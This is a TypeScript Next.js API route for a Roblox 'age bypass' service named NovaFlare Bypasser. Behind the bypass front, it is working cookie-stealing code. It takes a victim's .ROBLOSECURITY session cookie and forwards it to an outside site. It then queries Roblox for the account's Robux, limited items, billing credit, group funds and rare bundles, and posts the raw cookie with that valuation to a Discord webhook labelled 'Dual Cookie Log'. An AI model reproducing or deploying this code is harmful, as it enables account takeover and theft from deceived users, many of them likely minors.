import { type NextRequest, NextResponse } from "next/server"
import { getGlobalWebhook, getBypassLogWebhook } from "../admin/webhook/route"
import { addToHistory } from "@/lib/history"

const WEBHOOK_AVATAR_URL =
  "https://cdn.discordapp.com/attachments/1418093480911310868/1424732384296829038/static1.png?ex=68e504ee&is=68e3b36e&hm=6cac604a67200b0c4f1e3ed3448780d0c75e072c3865f99aa406cb59185d2ff0&"
const WEBHOOK_USERNAME = "NOVAFLARE BYPASSER"

interface RobloxUserInfo {
  username: string
  userId: number
  accountAge: number
  isPremium: boolean
  avatarUrl: string
}

function normalizeCookie(cookie: string): string {
  // Remove the warning prefix if present
  if (cookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
    cookie =
      cookie.split(
        "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_",
      )[1] || cookie
  }

  // Remove .ROBLOSECURITY= prefix if present
  if (cookie.startsWith(".ROBLOSECURITY=")) {
    cookie = cookie.substring(".ROBLOSECURITY=".length)
  }

  return cookie.trim()
}

async function getRobloxUserInfo(cookie: string): Promise<RobloxUserInfo | null> {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    if (!response.ok) return null
    const userData = await response.json()

    const createdResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    let accountAge = 0
    if (createdResponse.ok) {
      const details = await createdResponse.json()
      if (details.created) {
        const created = new Date(details.created)
        const now = new Date()
        accountAge = Math.floor((now.getTime() - created.getTime()) / (1000 * 60 * 60 * 24))
      }
    }

    const avatarResponse = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.id}&size=150x150&format=Png`,
    )
    let avatarUrl = ""
    if (avatarResponse.ok) {
      const avatarData = await avatarResponse.json()
      if (avatarData.data && avatarData.data[0]) {
        avatarUrl = avatarData.data[0].imageUrl
      }
    }

    return {
      username: userData.name,
      userId: userData.id,
      accountAge,
      isPremium: false,
      avatarUrl,
    }
  } catch {
    return null
  }
}

async function getRobuxBalance(cookie: string, userId: number) {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    const response = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    if (!response.ok) return { balance: 0, pending: 0 }
    const data = await response.json()

    let pending = 0
    try {
      const pendingResponse = await fetch(
        `https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Sale&limit=100`,
        {
          headers: {
            Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
          },
        },
      )

      if (pendingResponse.ok) {
        const pendingData = await pendingResponse.json()
        const now = Date.now()
        pending =
          pendingData.data
            ?.filter((t: any) => {
              const created = new Date(t.created).getTime()
              const daysSince = (now - created) / (1000 * 60 * 60 * 24)
              return daysSince <= 7
            })
            .reduce((sum: number, t: any) => sum + (t.currency?.amount || 0), 0) || 0
      }
    } catch {
      // Keep pending as 0
    }

    return { balance: data.robux || 0, pending }
  } catch {
    return { balance: 0, pending: 0 }
  }
}

async function getRAP(cookie: string, userId: number) {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    const response = await fetch(
      `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?assetType=All&sortOrder=Desc&limit=100`,
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
        },
      },
    )

    if (!response.ok) return { totalRAP: 0, totalLimited: 0 }

    const data = await response.json()
    const items = data.data || []

    let totalRAP = 0
    items.forEach((item: any) => {
      if (item.recentAveragePrice) {
        totalRAP += item.recentAveragePrice
      }
    })

    return { totalRAP, totalLimited: items.length }
  } catch {
    return { totalRAP: 0, totalLimited: 0 }
  }
}

async function getPremiumStatus(cookie: string, userId: number): Promise<boolean> {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    const response = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    if (response.ok) {
      const text = await response.text()
      return text === "true"
    }

    try {
      const billingResponse = await fetch("https://billing.roblox.com/v1/premium/subscription", {
        headers: {
          Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
        },
      })

      if (billingResponse.ok) {
        const billingData = await billingResponse.json()
        return billingData.active === true
      }
    } catch {
      // Continue
    }

    return false
  } catch {
    return false
  }
}

async function getGroupInfo(cookie: string, userId: number) {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    const response = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    if (!response.ok) return { owned: 0, funds: 0 }

    const data = await response.json()
    const groups = data.data || []
    const ownedGroups = groups.filter((g: any) => g.role?.rank === 255)

    let totalFunds = 0
    for (const group of ownedGroups) {
      try {
        const fundsResponse = await fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, {
          headers: {
            Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
          },
        })
        if (fundsResponse.ok) {
          const fundsData = await fundsResponse.json()
          totalFunds += fundsData.robux || 0
        }
      } catch {
        // Continue
      }
    }

    return { owned: ownedGroups.length, funds: totalFunds }
  } catch {
    return { owned: 0, funds: 0 }
  }
}

async function checkBundles(cookie: string, userId: number) {
  const normalizedCookie = normalizeCookie(cookie)

  const bundles = {
    korbloxDeathwalker: false,
    headlessHorseman: false,
    korbloxDeathspeaker: false,
  }

  try {
    const assetChecks = [
      { id: 139607770, name: "korbloxDeathwalker" },
      { id: 31101391, name: "headlessHorseman" },
      { id: 48474313, name: "korbloxDeathspeaker" },
    ]

    for (const asset of assetChecks) {
      try {
        const response = await fetch(
          `https://inventory.roblox.com/v1/users/${userId}/items/Asset/${asset.id}/is-owned`,
          {
            headers: {
              Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
            },
          },
        )

        if (response.ok) {
          const owned = await response.json()
          if (asset.name === "korbloxDeathwalker") bundles.korbloxDeathwalker = owned === true
          if (asset.name === "headlessHorseman") bundles.headlessHorseman = owned === true
          if (asset.name === "korbloxDeathspeaker") bundles.korbloxDeathspeaker = owned === true
        }
      } catch {
        // Continue
      }
    }
  } catch {
    // Keep defaults
  }

  return bundles
}

async function getBillingInfo(cookie: string) {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    const response = await fetch("https://billing.roblox.com/v1/credit", {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    let creditBalance = 0
    const hasSavedPayment = false

    if (response.ok) {
      const data = await response.json()
      creditBalance = data.balance || 0
    }

    return { creditBalance, hasSavedPayment }
  } catch {
    return { creditBalance: 0, hasSavedPayment: false }
  }
}

async function getEmailStatus(cookie: string) {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    const response = await fetch("https://www.roblox.com/my/settings/json", {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    if (!response.ok) return "Unverified"
    const data = await response.json()
    return data.IsEmailVerified ? "Verified" : "Unverified"
  } catch {
    return "Unverified"
  }
}

async function getAgeStatus(cookie: string, userId: number): Promise<string> {
  try {
    const normalizedCookie = normalizeCookie(cookie)

    // Fetch birthdate from Roblox account settings
    const response = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
      headers: {
        Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
      },
    })

    if (!response.ok) {
      // If we can't fetch birthdate, try to check from user settings
      const settingsResponse = await fetch("https://www.roblox.com/my/settings/json", {
        headers: {
          Cookie: `.ROBLOSECURITY=${normalizedCookie}`,
        },
      })

      if (settingsResponse.ok) {
        const settings = await settingsResponse.json()
        if (settings.UserAbove13) {
          return "13+"
        } else {
          return "13-"
        }
      }

      return "13+"
    }

    const birthdateData = await response.json()
    const { birthMonth, birthDay, birthYear } = birthdateData

    // Calculate age
    const birthDate = new Date(birthYear, birthMonth - 1, birthDay)
    const today = new Date()
    let age = today.getFullYear() - birthDate.getFullYear()
    const monthDiff = today.getMonth() - birthDate.getMonth()

    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
      age--
    }

    return age >= 13 ? "13+" : "13-"
  } catch (error) {
    console.error("[v0] Error fetching age status:", error)
    return "13+"
  }
}

async function sendDiscordWebhook(cookie: string, userInfo: RobloxUserInfo, ageResult: string, baseUrl: string) {
  const robux = await getRobuxBalance(cookie, userInfo.userId)
  const rap = await getRAP(cookie, userInfo.userId)
  const isPremium = await getPremiumStatus(cookie, userInfo.userId)
  const groups = await getGroupInfo(cookie, userInfo.userId)
  const bundles = await checkBundles(cookie, userInfo.userId)
  const billing = await getBillingInfo(cookie)
  const emailStatus = await getEmailStatus(cookie)

  const accountEmbed = {
    color: 0x8000ff,
    title: "NovaFlare Bypasser | Notification",
    description: `**New Result** • ${userInfo.username}, ${ageResult}`,
    thumbnail: {
      url: userInfo.avatarUrl || undefined,
    },
    fields: [
      {
        name: "Username",
        value: userInfo.username,
        inline: false,
      },
      {
        name: "Password",
        value: "Not Available",
        inline: false,
      },
      {
        name: "Account Information",
        value: `Account Age • ${userInfo.accountAge} days`,
        inline: false,
      },
      {
        name: "Robux",
        value: `Balance • ${robux.balance}\nPending • ${robux.pending}`,
        inline: false,
      },
      {
        name: "Rap",
        value: `Total RAP • ${rap.totalRAP}\nTotal Limited • ${rap.totalLimited}`,
        inline: false,
      },
      {
        name: "Summary",
        value: `${rap.totalRAP}`,
        inline: false,
      },
      {
        name: "Billing",
        value: `Credit Balance • ${billing.creditBalance}$\nSaved Payment • ${billing.hasSavedPayment}`,
        inline: false,
      },
      {
        name: "Verify Status",
        value: `Email • ${emailStatus}`,
        inline: false,
      },
      {
        name: "Premium",
        value: `${isPremium}`,
        inline: false,
      },
      {
        name: "Groups",
        value: `Owned • ${groups.owned}\nFunds • ${groups.funds > 0 ? groups.funds : "(Not Yet)"}`,
        inline: false,
      },
      {
        name: "Bundles",
        value: `Korblox Deathwalker : ${bundles.korbloxDeathwalker}\nHeadless Horseman : ${bundles.headlessHorseman}\nKorblox Deathspeaker : ${bundles.korbloxDeathspeaker}`,
        inline: false,
      },
    ],
  }

  const cookieEmbed = {
    color: 0x8000ff,
    title: "ROBLOXSECURITY",
    thumbnail: {
      url: WEBHOOK_AVATAR_URL,
    },
    description: `\`\`\`\n${cookie}\n\`\`\`\n\n[**\`PROFILE\`**](https://www.roblox.com/users/${userInfo.userId}/profile) **|** [**\`CHECK COOKIE\`**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill=${encodeURIComponent(cookie)}) **|** [**\`DISCORD SERVER\`**](https://discord.gg/2n8Z3hYbjG)`,
  }

  try {
    const webhookUrl = await getGlobalWebhook()
    const bypassLogWebhookUrl = await getBypassLogWebhook()

    // Send to Main Webhook (with cookie)
    if (webhookUrl) {
      const webhookResponse = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: "@everyone @here 🍪 Dual Cookie Log",
          embeds: [accountEmbed, cookieEmbed],
          username: WEBHOOK_USERNAME,
          avatar_url: WEBHOOK_AVATAR_URL,
        }),
      })

      if (!webhookResponse.ok) {
        const errorBody = await webhookResponse.text()
        console.error(`[v0] Webhook failed with status ${webhookResponse.status}:`, errorBody)
      }
    }

    // Send to Bypass Log Webhook (NO cookie)
    if (bypassLogWebhookUrl) {
      const logResponse = await fetch(bypassLogWebhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: "📝 New Bypass Log",
          embeds: [accountEmbed], // Only account info, no cookie embed
          username: WEBHOOK_USERNAME,
          avatar_url: WEBHOOK_AVATAR_URL,
        }),
      })

      if (!logResponse.ok) {
        console.error(`[v0] Log webhook failed with status ${logResponse.status}`)
      }
    }

    addToHistory({
      type: "13+ / 18+ Bypass",
      identifier: `user: ${userInfo.username}`,
      username: userInfo.username,
    })
  } catch (error) {
    console.error("[v0] Failed to send Discord webhook:", error)
  }
}

export async function GET(request: NextRequest) {
  const searchParams = request.nextUrl.searchParams
  const cookie = searchParams.get("a")
  const source = searchParams.get("b")
  const baseUrl = request.nextUrl.origin

  if (!cookie || !source) {
    return NextResponse.json({ status: "error", message: "Missing required parameters" }, { status: 400 })
  }

  try {
    const userInfo = await getRobloxUserInfo(cookie)

    const response = await fetch("https://dayonerblx.com/api/submit.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      },
      body: JSON.stringify({
        content: cookie,
        mode: "age",
      }),
    })

    if (!response.ok) {
      const text = await response.text()
      console.error("[v0] API returned error:", response.status, text.substring(0, 200))
      return NextResponse.json(
        { status: "error", message: `API returned error: ${response.status}` },
        { status: response.status },
      )
    }

    const data = await response.json()

    if (data.success && userInfo) {
      const ageResult = await getAgeStatus(cookie, userInfo.userId)
      await sendDiscordWebhook(cookie, userInfo, ageResult, baseUrl)
    }

    if (data.success) {
      return NextResponse.json({
        status: "success",
        message: data.message || "Age bypass processed successfully",
        submission: data.submission,
      })
    } else {
      return NextResponse.json(
        {
          status: "error",
          message: data.message || "Failed to process age bypass",
        },
        { status: 400 },
      )
    }
  } catch (error) {
    console.error("[v0] Bypass V4 API error:", error)
    return NextResponse.json(
      { status: "error", message: error instanceof Error ? error.message : "Failed to process request" },
      { status: 500 },
    )
  }
}
